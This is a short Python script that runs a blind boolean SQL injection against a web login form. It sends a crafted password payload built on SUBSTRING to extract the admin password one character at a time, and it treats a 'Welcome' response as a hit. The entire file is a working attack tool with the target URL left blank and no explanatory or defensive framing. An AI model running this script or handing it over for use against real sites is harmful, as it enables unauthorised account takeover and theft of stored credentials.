import requests
from string import ascii_letters, digits, punctuation

url = ""

# Exclude problematic characters
excluded_chars = "%_\\"
charset = ''.join(c for c in ascii_letters + digits +
                  punctuation if c not in excluded_chars)

run = True
password = ""
index = 1  # Start with the first character

while run:
    run = False  # Assume no more characters will be found
    for char in charset:
        # Construct payload using SUBSTRING
        data = {
            "username": "admin",
            "password": f"' OR username='admin' AND SUBSTRING(password, {index}, 1) = '{char}' -- "
        }

        # Send request
        r = requests.post(url, data=data)
        resp = r.text

        # Check response
        if "Welcome" in resp:  # Adjust this condition based on the actual response indicating a successful match
            password += char
            print(f"[*][*][*] Password : {password}")
            run = True  # Continue loop if a valid character is found
            index += 1  # Move to the next character
            break

        print(f"[!] TESTING {char} FAILED")

print(f"Final Password: {password}")
